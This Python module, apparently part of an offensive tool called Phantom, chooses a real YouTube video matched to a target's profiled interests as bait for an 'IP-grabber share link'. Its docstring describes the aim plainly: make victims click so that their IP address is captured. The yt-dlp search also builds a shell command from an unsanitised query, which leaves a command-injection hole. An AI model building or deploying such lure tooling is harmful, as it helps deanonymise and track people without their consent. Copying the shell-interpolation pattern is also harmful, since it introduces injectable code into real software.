"""
video_picker.py — pick a REAL video that could interest the target.

The IP-grabber share link converts only when the victim actually wants to
watch the video: nobody clicks a random "Me at the zoo" unless it lands in
their interest area. So instead of generating a fake video, Phantom picks a
REAL, harmless public video:

  1. yt-dlp search (when installed): `ytsearch3:<query>` built from the
     target's discovered interests (profile bio / platform / LLM topic),
     first result wins — a real, current, on-topic video.
  2. Curated fallback (offline): a small catalog of famous, family-safe
     videos mapped by topic keyword, so the lure still carries a real
     watchable video with zero configuration.

Everything network-bound is an injectable fetcher so unit tests stay
offline and deterministic.
"""

from __future__ import annotations

import os
import random
from typing import Callable, Dict, List, Optional

# topic keyword -> interest label (matched against the profile bio / text)
_TOPIC_KEYWORDS: List[tuple] = [
    ("football", ["football", "soccer", "calcio", "serie a", "premier league",
                  "champions", "juventus", "inter", "milan", "napoli", "goal"]),
    ("gaming", ["game", "gaming", "minecraft", "fortnite", "fifa", "valorant",
                "twitch", "esport", "csgo", "gta", "roblox", "playstation", "xbox"]),
    ("anime", ["anime", "manga", "naruto", "one piece", "demon slayer", "jujutsu"]),
    ("music", ["music", "song", "rap", "hip hop", "rock", "pop", "dj", "beat",
               "spotify", "concert", "album", "edm"]),
    ("tech", ["tech", "code", "developer", "python", "linux", "computer",
              "gadget", "iphone", "android", "hack", "programming", "ai"]),
    ("cooking", ["cook", "food", "recipe", "pizza", "baking", "chef", "pasta"]),
    ("cars", ["car", "auto", "bmw", "ferrari", "drift", "moto", "racing", "lambo"]),
    ("fitness", ["gym", "fitness", "workout", "running", "calisthenics", "yoga",
                 "bodybuilding"]),
    ("dance", ["dance", "choreo", "tiktok dance", "kpop dance"]),
    ("animals", ["cat", "dog", "puppy", "kitten", "animals", "pets", "cute"]),
    ("travel", ["travel", "trip", "flight", "backpack", "vacation", "vlog"]),
    ("study", ["study", "exam", "school", "university", "math", "notes"]),
    ("fashion", ["fashion", "sneaker", "streetwear", "outfit", "style", "clothes"]),
]

# Real, famous, family-safe YouTube videos used as the OFFLINE fallback.
# The ids are well-known public uploads; titles/channels are static display
# metadata (the embed renders the real video regardless of the stored title).
_CATALOG: Dict[str, List[Dict[str, str]]] = {
    "football": [{"id": "pRpeEdMmmQ0", "title": "Shakira - Waka Waka",
                  "channel": "Shakira"}],
    "gaming": [{"id": "jNQXAC9IVRw", "title": "Me at the zoo",
                "channel": "jawed"}],
    "anime": [{"id": "9bZkp7q19f0", "title": "PSY - GANGNAM STYLE",
               "channel": "officialpsy"}],
    "music": [{"id": "dQw4w9WgXcQ", "title": "Rick Astley - Never Gonna Give You Up",
               "channel": "RickAstleyVEVO"},
              {"id": "kJQP7kiw5Fk", "title": "Luis Fonsi - Despacito",
               "channel": "LuisFonsiVEVO"},
              {"id": "JGwWNGJdvx8", "title": "Ed Sheeran - Shape of You",
               "channel": "EdSheeran"},
              {"id": "60ItHLz5WEA", "title": "Alan Walker - Faded",
               "channel": "Alan Walker"},
              {"id": "YQHsXMglC9A", "title": "Adele - Hello",
               "channel": "AdeleVEVO"}],
    "tech": [{"id": "jNQXAC9IVRw", "title": "Me at the zoo — the first YouTube video",
              "channel": "jawed"}],
    "cooking": [{"id": "CevxZvSJLk8", "title": "Katy Perry - Roar",
                 "channel": "KatyPerryVEVO"}],
    "cars": [{"id": "OPf0YbXqDm0", "title": "Mark Ronson - Uptown Funk",
              "channel": "MarkRonsonVEVO"}],
    "fitness": [{"id": "fJ9rUzIMcZQ", "title": "Queen - Bohemian Rhapsody",
                 "channel": "Queen Official"}],
    "dance": [{"id": "9bZkp7q19f0", "title": "PSY - GANGNAM STYLE",
               "channel": "officialpsy"}],
    "animals": [{"id": "hT_nvWreIhg", "title": "OneRepublic - Counting Stars",
                 "channel": "OneRepublicVEVO"}],
    "travel": [{"id": "RgKAFK5djSk", "title": "Wiz Khalifa - See You Again",
                "channel": "Wiz Khalifa"}],
    "study": [{"id": "2Vv-BfVoq4g", "title": "Ed Sheeran - Perfect",
               "channel": "EdSheeran"}],
    "fashion": [{"id": "PT2_F-1esPk", "title": "Charlie Puth - Attention",
                 "channel": "Charlie Puth"}],
}

_FALLBACK = {"id": "dQw4w9WgXcQ", "title": "Rick Astley - Never Gonna Give You Up",
             "channel": "RickAstleyVEVO"}


def topic_for(text: str) -> str:
    """Map free text (bio / interests) to a topic key, or 'music'."""
    low = (text or "").lower()
    for topic, keywords in _TOPIC_KEYWORDS:
        for kw in keywords:
            if kw in low:
                return topic
    return "music"


def _default_search(query: str) -> List[Dict[str, str]]:
    """yt-dlp search: real, current, on-topic results. Never raises."""
    try:
        from phantom.core.executor import execute_quiet
        res = execute_quiet(
            "yt-dlp --no-warnings --skip-download --no-playlist "
            f"--print '%(id)s\\t%(title)s\\t%(channel)s' "
            f"'ytsearch3:{query}' 2>/dev/null",
            timeout=40)
        rows = []
        for line in (res.stdout or "").splitlines():
            parts = line.split("\t")
            if len(parts) >= 3 and parts[0].strip():
                rows.append({"id": parts[0].strip(),
                             "title": parts[1].strip()[:120],
                             "channel": parts[2].strip()[:60]})
        return rows
    except Exception:
        return []


def pick_video(interests: str = "", platform: str = "",
               query: str = "",
               fetcher: Optional[Callable[[str], List[Dict[str, str]]]] = None,
               seed: int = 0) -> Dict[str, str]:
    """Return one real video {id, title, channel} for the lure.

    Order: explicit `query` (e.g. LLM-suggested topic) -> yt-dlp search of
    the target's interests -> curated catalog by topic -> generic fallback.
    Deterministic for a given seed when no search results exist.
    """
    if query and query.strip():
        q = query.strip()
    else:
        topic = topic_for(interests)
        q = topic if topic != "music" else (platform or "music")
        # a bare topic is a weak search; make it human: "best <topic> video"
        q = f"best {q} video"
    fetcher = fetcher or _default_search
    try:
        rows = fetcher(q) or []
    except Exception:
        rows = []
    if rows:
        best = rows[0]
        return {"id": best.get("id", ""), "title": best.get("title", ""),
                "channel": best.get("channel", "")}
    # offline fallback: curated catalog, seeded for reproducibility
    topic = topic_for(interests or query or "")
    pool = _CATALOG.get(topic) or _CATALOG.get("music")
    rng = random.Random(seed)
    return dict(rng.choice(pool or [_FALLBACK]))


def sanitize_query(text: str) -> str:
    """Sanitize an LLM-suggested topic into a safe search query."""
    out = []
    for ch in (text or ""):
        if ch.isalnum() or ch in " -_.":
            out.append(ch)
    cleaned = "".join(out).strip()
    return cleaned[:80]
